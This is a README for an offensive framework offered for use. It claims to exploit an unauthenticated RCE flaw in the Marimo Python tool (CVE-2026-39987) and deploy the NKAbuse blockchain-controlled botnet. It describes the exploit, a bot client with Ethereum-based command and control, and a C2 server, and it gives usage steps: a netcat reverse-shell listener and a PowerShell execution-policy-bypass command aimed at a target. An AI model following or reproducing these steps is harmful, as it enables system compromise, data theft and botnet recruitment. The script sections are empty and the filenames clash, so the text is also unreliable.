MARIMO RCE & NKABUSE EXPLOIT FRAMEWORK (CVE-2026-39987) - **RE-WEAPONIZED**

 **Overview**

This framework exploits CVE-2026-39987, a critical Remote Code Execution (RCE) vulnerability in Marimo, a popular Python-based data visualization tool. Attackers actively exploit this flaw to deploy NKAbuse, a blockchain-based botnet malware.

The framework includes:

Python Exploit (marimo_rce.py)  Initial RCE exploit.
JavaScript Payload (nkabuse_bot.js)  NKAbuse botnet client.
Ruby C2 Server (c2_server.rb)  Command & Control server for botnet management

======================================

JAVASCRIPT PAYLOAD: nkabuse_bot.js

(Deployed by marimo_rce.py to create a blockchain-based botnet.)

======================================


RUBY C2 SERVER: c2_server.rb

Run with: "ruby c2Serverv4.rb <lport>.)"

======================================


EXPLOIT WORKFLOW

Run the Python Exploit (marimo_rce.py)
Exploits CVE-2026-39987 to gain RCE on the target.
Deploys a reverse shell and the NKAbuse botnet client (nkabuse_bot.js).

NKAbuse Botnet Client (nkabuse_bot.js)
Connects to the Ethereum blockchain.
Polls the NKAbuse smart contract for commands.
Executes commands and submits results back to the blockchain.

C2 Server (c2_server.rb)
Manages connected bots.
Dispatches commands via the blockchain.
Receives results from bots.

=============================================

EXPLOIT DETAILS
1. CVE-2026-39987 (Marimo RCE) **RE-WEAPONIZED**

    Vulnerability: Unauthenticated remote code execution in Marimo (<1.2.4).
    Impact: Full system compromise, deployment of NKAbuse malware.
    Exploitation: Sends a crafted JSON payload to /api/v1/execute to execute arbitrary PowerShell code.

2. NKAbuse Malware

    Blockchain-Based C2: Uses Ethereum smart contracts for command and control.
    Persistence: Runs as a background process, surviving reboots.
    Capabilities:
        Remote command execution.
        Data exfiltration.
        Botnet coordination.

🛠️ USAGE INSTRUCTIONS
1. Set Up Listener
powershell

# On your attacker machine:
nc -lvnp 4444

2. Execute Exploit
powershell

# On your attacker machine:
powershell -ep bypass -f neo_marimo_rce.ps1 -TargetUrl "http://vulnerable-target.com" -LHOST "your_ip" -LPORT 4444

3. Expected Output

[+] Exploit successful! Reverse shell and NKAbuse deployed.
[+] Listener should receive connection from http://vulnerable-target.com



==============================================================================================
									END OF READ ME 
